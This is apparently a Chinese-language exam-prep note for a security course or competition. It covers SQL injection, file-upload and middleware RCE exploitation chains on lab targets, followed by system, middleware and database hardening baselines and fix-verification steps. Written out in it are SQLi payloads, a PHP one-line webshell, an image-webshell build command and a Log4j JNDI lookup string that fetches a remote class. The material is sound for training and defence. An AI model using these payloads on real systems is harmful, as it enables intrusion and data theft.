# 07 漏洞利用与安全加固实战

> 对应 10月20日上午：Web 高频漏洞（SQL 注入、文件上传、中间件 RCE）靶机复现与利用链构造；安全加固：系统/中间件/数据库加固基线与修复验证。

## 一、SQL 注入利用链（靶机实战）【背】

### 标准五步

```
① 找注入点：' 或 and 1=1 / and 1=2 观察差异
② 定类型：有回显→联合/报错；无回显→布尔/时间
③ 数列：union select 1,2,3,4,...n 直到不报错
④ 脱库：database() → schemata → tables → columns → 数据
⑤ 收尾：读文件 load_file() / 写马 into outfile（需 secure_file_priv 允许）
```

### 判断口诀【背】

- 页面**直接显示数据** → 联合注入
- 页面**显示数据库报错** → 报错注入（`updatexml(1,concat(0x7e,database()),1)`）
- 页面**只有两种状态** → 布尔
- 页面**啥都不变** → 时间盲注（`and if(1=1,sleep(5),0)`）
- **手工优先，sqlmap 验证**（比赛手工分高，工具快但特征明显）

## 二、文件上传利用链【背】

```
① 侦察：看校验方式（前端？后缀？MIME？文件头？）
② 构造：一句话木马 <?php @eval($_POST['cmd']);?>
③ 绕过：对照 03 篇绕过表选对应手段（如 .php5、图片马、抓包改 MIME）
④ 落地：确认真实路径（返回包/报错/目录猜测）
⑤ 连接：蚁剑/菜刀/冰蝎连上 → 提权 → 内网
```

- 图片马制作：`copy /b normal.jpg + shell.php => shell.jpg`，配解析漏洞或 `.htaccess` 才能执行。
- 冰蝎特点：流量 AES 加密，日志里只见大段密文 POST——日志分析题常考这个识别点。

## 三、中间件 RCE 利用链【背】

```
① 指纹识别：端口/路径/banner（7001=Weblogic、/manager=tomcat、Shiro 看 rememberMe cookie）
② 比对版本 → 定 CVE → 找 EXP（POC 测试只验证不破坏）
③ 利用：反序列化/JNDI 注入回显
④ 留证：截图 payload 与回显，靶机上不真拖数据
```

JNDI 注入一句话：让服务器"自己伸手去拿"远程恶意类——`${jndi:ldap://IP/Exploit}`。

## 四、安全加固基线（对照修复三件套）【背】

### 1. 系统加固基线

```
账号：改默认口令、禁用/改名管理员、口令策略（长度≥8、复杂度、锁定阈值）
服务：关不必要服务端口（netstat 复查）、SSH 禁 root 直接登录、改默认端口可选
补丁：高危漏洞优先（RCE 类先打）
审计：开启登录日志、操作日志
```

### 2. 中间件加固基线（以 Nginx/Apache/Tomcat 为例）

```
版本信息隐藏：Server Tokens off / 删报错页版本
目录：禁止目录遍历（Options -Indexes）、上传目录禁执行（Nginx: location ~* ^/upload/.*\.(php|jsp)$ {deny all;}）
权限：Web 进程用低权账户跑，站点目录只给读写不给执行
组件：老漏洞组件升级（Fastjson、Shiro、Log4j 版本达标）
超时与限速：防慢速攻击与爆破
```

### 3. 数据库加固基线【背】

```
账号：应用不用 root、一库一账号最小权限、删除匿名账户和 test 库
远程：root 禁止远程登录（bind 127.0.0.1 或 skip-networking）
日志：开 general_log（应急用）、error log 必开
SQL 注入根治：参数化查询（预编译）——技术修复的最终答案
```

## 五、修复验证（闭环必做）【背】

```
修复 → 用原 payload 复测 → 确认失败/无害 → 留截图证据 → 升级 WAF/监控规则
```

比赛/考核要点：**只修不复测 = 半途而废**；复测截图=得分证据。

## 六、高频考点提示

1. 注入五步（找点→定型→数列→脱库→收尾）顺序必背，数列环节最易漏。
2. 上传利用链注意"侦察校验方式"这步——上来就绕是错的。
3. 加固答"三基线"：系统、中间件、数据库各至少 3 条。
4. **参数化查询**是注入修复唯一正确答案，其余（过滤、WAF）都是辅助。
5. 修复验证闭环：修复→复测→截图→上规则，四步答全。
